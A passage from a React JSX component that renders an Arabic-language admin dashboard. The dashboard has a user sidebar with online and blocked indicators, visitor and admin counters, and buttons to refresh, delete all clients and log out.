                  <span className="user-sidebar-item__row">
                    <span
                      className={`online-dot${userOnline ? " online-dot--on" : ""}`}
                      title={userOnline ? "متصل" : "غير متصل"}
                    />
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {u.blocked ? (
                      <span className="user-sidebar-item__blocked-tag">
                        محظور
                      </span>
                    ) : null}
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.nation_number || u.phone || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={handleMobileBackToList}
              >
                <i className="fas fa-arrow-right"></i> القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div
                className="mobile-top-user"
                title={selectedUser.fullname || "مجهول"}
              >
                <span className="mobile-top-user__name">
                  {selectedUser.fullname || "مجهول"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">
              <i className="fas fa-terminal"></i> غرفة التحكم — سلامة
            </span>
          </div>
          <div className="top-actions">
            <div className="stats-pill stats-pill--visitors">
              <span className="pulse-dot pulse-dot--inline"></span>
              زوار: {onlineCounts.visitors}
            </div>
            <div className="stats-pill stats-pill--admins">
              أدمن: {onlineCounts.dashboard}
            </div>
            <div className="stats-pill">إجمالي الطلبات: {Users.length}</div>
            <button
              type="button"
              className="btn-action btn-refresh"
              onClick={handleSoftRefresh}
            >
              <i className="fas fa-sync-alt"></i> تحديث
            </button>
            <button
              type="button"
              className="btn-action btn-del-all"
              onClick={deleteAllUsers}
            >
              <i className="fas fa-trash-alt"></i> حذف جميع العملاء
            </button>
            <button
              type="button"
              className="btn-action btn-out"
              onClick={handleLogOut}
            >
              <i className="fas fa-sign-out-alt"></i> تسجيل خروج
            </button>
          </div>
        </header>

        <div
          className="grid-container grid-container--single"
          id="clients-container"
        >
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main;
